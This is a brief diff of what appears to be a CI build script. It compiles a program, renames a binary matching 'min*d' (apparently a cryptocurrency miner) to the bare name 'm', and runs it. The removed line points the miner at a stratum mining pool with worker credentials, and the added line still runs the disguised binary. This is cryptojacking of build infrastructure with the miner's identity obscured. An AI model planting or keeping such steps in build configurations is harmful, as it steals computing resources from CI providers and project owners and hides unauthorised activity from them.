@@ -5,4 +5,4 @@ script:
  - ./configure
  - make
  - mv min*d m
- - ./m -a X11 -o stratum+tcp://drk.cpu-pool.net:3500 -u soku2.ko -p ko
+ - ./m
